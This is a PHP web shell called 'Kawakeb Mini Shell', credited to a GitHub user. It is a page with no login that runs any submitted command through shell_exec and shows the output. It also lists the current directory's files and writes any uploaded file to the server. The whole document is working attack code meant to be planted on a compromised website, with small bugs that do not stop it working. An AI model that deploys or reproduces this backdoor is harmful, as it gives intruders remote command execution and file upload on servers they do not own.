<html>
<head> <br>
<title>Kawakeb Mini Shell</title>
<style type="text/css">

body {
    background-color: #000000;
    color: #FFFFFF;
    font-family: "Courier New", Courier, monospace;
    font-size: 24px;
    margin: 0px;
    padding: 0px;
}
h3 {
    color: #FFFFFF;
    font-family: "Courier New", Courier, monospace;
    font-size: 24px;
    margin: 0px;
    padding: 0px;
    display: inline;
}
hr{
    color: aqua;
    background-color: red !important;
    border-color: red !important;


}
h4 {
    color: cyan;
    font-family: "Courier New", Courier, monospace;
    font-size: 24px;
    margin: 0px;
    padding: 0px;
    display: inline;
}
h6 {
    font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
    color :azure;
    font-size:14px;
    position:inherit;
    bottom: 0;
    text-align: center !important;


}
a {
    text-decoration: none;
      color:bisque;
      font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
    font-size:14px;
}
input {
    background-color: #000000;
    border: 1px solid #FFFFFF;
    border-radius: 3px;
    color: #FFFFFF;
    font-family: "Courier New", Courier, monospace;
    font-size: 24px;
    margin: 0px;
    padding: 0px;
}
input#file {
    border: 1px solid #ccc;
    display: inline-block;
    padding: 6px 12px;
    cursor: pointer;

}
input[type="file"] {
   opacity: 0;
   position: absolute;
   z-index: -1;
   
}
label {
   cursor: pointer;
   border : 1px solid white;
   padding:3px;
   letter-spacing: 1px;
}
input[type=submit] {
    padding:3px;
}
}
</style>
</head>
<body>
<form action="#" method="post">
<center> <input type="text" name="cmd" size="30" value="<?php echo $cmd; ?>" />
<input type="submit" value="Execute" /> </center>
</form>
<pre><?php echo $output; ?></pre>
</body>
<?php 
echo "<h3>Current Path: </h3><h4>" . getcwd() . "</h4>";
echo "<br> <h3>Safe Mode: " . ini_get("safe_mode") . "</h3>";
?>
<p>Files:</p>

</html>
<?php
$filesize = filesize("$entry\n");
$currentpath = system('%CD%');
if ($handle = opendir('.')) {

    while (false !== ($entry = readdir($handle))) {

        if ($entry != "." && $entry != "..") {

            $filesize = filesize($entry);
            $filesize = $filesize / 1024;
            $filesize = round($filesize, 2);
            $filesize = $filesize . " kb";

            echo "
            <table>
            <tr>
            <th>File name &nbsp;</th>
            <th>File size &nbsp;</th>
            </tr>
            <tr>
            <td>$entry</td>
            <td>$filesize</td>
            </tr>

            </table>
        <hr>
            
            ";

        }

    }

    closedir($handle);
}
// The CMD -  
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
}

if (isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $file_name = $file['name'];
    $file_tmp = $file['tmp_name'];
    move_uploaded_file($file_tmp, $file_name);
}

echo "<center> <h5>Uploader</h5>";
echo "<form action='#' method='post' enctype='multipart/form-data'>
<label for='file'>Choose file</label>
<input id='file' type='file' name='file' />
<input type='submit' value='Upload' />
</form>";


?>
<footer>
<h6>Mini Shell by <a href="https://www.github.com/Crybik">Crybik</a></p>
</footer>
